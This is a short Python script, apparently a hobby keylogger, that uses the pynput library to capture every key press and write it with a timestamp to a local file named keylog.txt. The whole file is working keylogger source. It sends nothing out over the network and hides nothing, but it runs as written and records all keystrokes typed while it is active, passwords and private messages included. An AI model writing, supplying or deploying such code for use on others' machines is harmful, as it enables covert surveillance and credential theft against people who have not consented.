import pynput #(the library used for monitoring and controlling input devices like keyboard and mouse.)
from pynput.keyboard import Key,Listener
import logging

log_dir=r'/media/asmitjn/Important Data/Python files/Keylogger'
logging.basicConfig(filename=(log_dir+r'/keylog.txt'),level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()